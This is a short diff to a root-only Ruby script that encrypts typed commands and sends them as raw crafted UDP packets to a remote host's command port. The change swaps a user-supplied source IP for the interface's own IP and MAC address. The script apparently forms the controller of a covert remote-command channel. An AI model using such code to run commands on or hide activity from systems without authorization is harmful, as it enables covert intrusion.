@@ -34,6 +34,7 @@ raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0
 # Create UDP Socket for Commands
 udp = UDPPacket.new
 dis = Dispatch.new
+cfg = Utils.whoami?(:iface => opts[:dev])
 
 while 1 do
 	print "> "
@@ -90,13 +91,16 @@ while 1 do
 	else # Normal commands
 		hash = dis.encrypt(cmd)
 
+        udp.eth_saddr = cfg[:eth_saddr]
+
 		udp.udp_src = rand(0xfff - 1024) + 1024
 		udp.udp_dst = opts[:cport]
 
-		udp.ip_saddr = opts[:src]
+		udp.ip_saddr = cfg[:ip_saddr]
 		udp.ip_daddr = opts[:host]
 
 		udp.payload = hash
+		
 		udp.recalc
 		udp.to_w(opts[:dev])
 	
